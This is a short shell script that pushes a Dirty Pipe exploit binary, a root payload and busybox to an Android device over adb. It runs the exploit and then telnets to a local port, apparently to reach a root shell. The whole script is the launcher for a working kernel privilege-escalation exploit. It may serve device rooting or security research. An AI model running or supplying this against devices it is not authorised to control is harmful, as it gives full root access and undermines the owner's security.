#!/bin/sh
set -e

dir=/data/local/tmp
adb=${adb:-"adb"}

$adb push dirtypipe-android startup-root magisk/busybox ${dir}
$adb shell chmod 755 ${dir}/dirtypipe-android ${dir}/startup-root ${dir}/busybox
$adb shell ${dir}/dirtypipe-android
$adb shell sleep 1
$adb shell ${dir}/busybox telnet 127.0.0.1 10847
